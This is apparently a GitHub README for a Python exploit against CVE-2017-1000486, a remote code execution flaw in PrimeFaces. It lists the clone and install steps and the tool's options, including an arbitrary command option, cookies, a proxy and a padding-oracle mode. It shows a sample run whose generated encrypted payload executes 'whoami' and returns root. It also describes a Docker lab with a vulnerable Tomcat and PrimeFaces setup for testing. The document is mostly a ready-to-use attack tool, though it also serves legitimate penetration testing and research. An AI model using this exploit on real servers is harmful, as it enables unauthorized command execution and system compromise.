# CVE-2017-1000486
Primefaces &lt;= 5.2.21, 5.3.8 or 6.0 - Remote Code Execution Exploit

To install the requirements execute:

```
git clone https://github.com/pimps/CVE-2017-1000486.git
cd CVE-2017-1000486
pip3 install -r requirements.txt
```

Here is how to use the exploit:

```
$ python primefaces.py -h

========================================================================
|     CVE-2017-1000486 - Primefaces Remote Code Execution Exploit      |
|                               by pimps                               |
========================================================================

usage: primefaces.py [-h] [-pw PASSWORD] [-pt PATH] [-c CMD] [-px PROXY]
                     [-ck COOKIE] [-o ORACLE] [-pl PAYLOAD]
                     target

positional arguments:
  target                             Target Host

optional arguments:
  -h, --help                         show this help message and exit
  -pw PASSWORD, --password PASSWORD  Primefaces Password (Default = primefaces
  -pt PATH, --path PATH              Path to dynamiccontent.properties
                                     (Default = /javax.faces.resource/dynamicc
                                     ontent.properties.xhtml)
  -c CMD, --cmd CMD                  Command to execute. (Default = whoami)
  -px PROXY, --proxy PROXY           Configure a proxy in the format
                                     http://127.0.0.1:8080/ (Default = None)
  -ck COOKIE, --cookie COOKIE        Configure a cookie in the format
                                     'COOKIE=VALUE; COOKIE2=VALUE2;' (Default
                                     = None)
  -o ORACLE, --oracle ORACLE         Exploit the target with Padding Oracle.
                                     Use 1 to activate. (Default = 0) (SLOW)
  -pl PAYLOAD, --payload PAYLOAD     EL Encrypted payload. That function is
                                     meant to be used with the Padding Oracle
                                     generated payload. (Default = None)

This script exploits an expression language remote code execution flaw in the
Primefaces JSF framework. Primefaces versions prior to 5.2.21, 5.3.8 or 6.0
are vulnerable to a padding oracle attack, due to the use of weak crypto and
default encryption password and salt.


$ python primefaces.py http://127.0.0.1:8090/

========================================================================
|     CVE-2017-1000486 - Primefaces Remote Code Execution Exploit      |
|                               by pimps                               |
========================================================================

[*] Generating payload using default Password...
[*] Generated Encrypted Payload: 4xE5s8AClZxUxmyaZjpBstMXUalIgOJHOtvxel/v4YWWwI8VZnuAX1191Sn+CK9NqgRYi2Eqx0Ip7pBmDQy2FwfV
xmTHSyueLw8lvBxR9XlJNxZIpqx8JeJdAJadoM6/fTVxHNSrHEo2BWInksdO2JCryCs0gp7fl+yzbivvc/3dqOsENXJSEuj1v8RULfmL9BNWGB1E6kaSzCMHA
q50id6wTK6l3r3CALrenstFeVs6H8taOicp4rXZB+4n5DEgRgEr36/a+Tfe6SvN82GDvyt80SpIlgsycJpP77l5bHs46I6TPeK9ROZdC2LBwbrPQXl0OGoXsH
2gQbKts3/JPErN8r5f8zyH9jJ1vYs/lyWVs2WmT0rHDkk+zw75eKkY3YwKYTL0oZFI0sO8w1wRaX+MVV1SjgvHKjkKN9W81WMvP0BrStfCPGs1OK/jrApynfs
ZisXjsgy6vVUlfBlI3/SzeeuunqGDjyhcGLgM1U8/qLM/XBEeC+txkljPWq5ZAfbrN9qtgqJSJD7OzfAtAQbXGHAfB+4emCKvBz0+wehBKRy6HfacUHB+DPj7
MON7T9iKV3QZ4Qcs8mCSkhlK6MZfj7zkGHsiTnbqQr+qTVj61Pvr6jHMS4akC7S9u2R5vl9gq8KY5wLv9QpyTGMya3hNS+LQXOzajwXr7mSibFWt5rEnRmQLw
28VSTtwxZnyHfSKYyCc/zHgx89ScL6ucsccAAHTolh4n3FBgj1jZmaoJ8eGDAa1l0v3NVYv6j6X8cDz5qEx+fcz4ftxUNCaGB/13OaqmdVZXCqGFkGlbbfhzo
0BkWBeo4yHxuzXCeLVQZ+hOEqk0jAxVxco97YTW6Yh0/qL+d6IhuAVc7WhH97tDiPnRsmSoJ6xPAPxrhdeHiNZoReymXDXPvIUB8BE6dn64MgjAevuN2m1lGV
wcwUUem+mwNtJggQ35/FRM7Gfuft1gZTNG+cCuSPD9wT/EYuB7dFE9W4d8BzX4X5zNH9d9MyR9tkC33ZlwKbRaBfwTI/RYef1OdOccQKsevIf6RrTbnL0vxzO
8aYp6FBq9x2EYdp54PiBFw/mAgKXhSFw0LhebS6LImNLdjV019/TFp81X210RejGkMXix5TWCCqFd3mmMdlbZB5AzeO2H8mh2BAoeUQs15+f2BpwTTcBUFzod
JZx0/Ibx781ZD/mdEo9bzCngHer7OUft/BrEE5cdrAaT96Bl0CYqPtDo8m4WvMU4UFpjFQn2JuTe6vEe+Ep6ljjlP33ZzG2SBJW0Ipb/RUAthLfMLYSXuo1MF
1vV1Chie4AbZ+RXyxDmGZqykJ7xZpYOdvj2Ap25y1fcy13UOV3YTlj6fJeP3Sd5bosILMp84fnv3eDX4lLjNpNRSnXoKee7XbLu14Hvnf9jjAMv8JDmnjxrCQ
V1TXA2/8enpl0ytV74kU5W0Zs+LuZjldi9oATW4Zj6w==
[*] Attempting to execute: whoami
[+] Exploit Result:

 root
```


To test this exploit I created a Dockerfile that will spawn a Tomcat 7.0 with the Primefaces 5.2 showcase application. To build the testing setup, after clone this repository, just run:

```
$ cd CVE-2017-1000486/
$ docker build . -t primefaces
$ docker run -p 8090:8080 -t primefaces
```

You should now be able to access the Primefaces Showcase application browsing to http://127.0.0.1:8090/
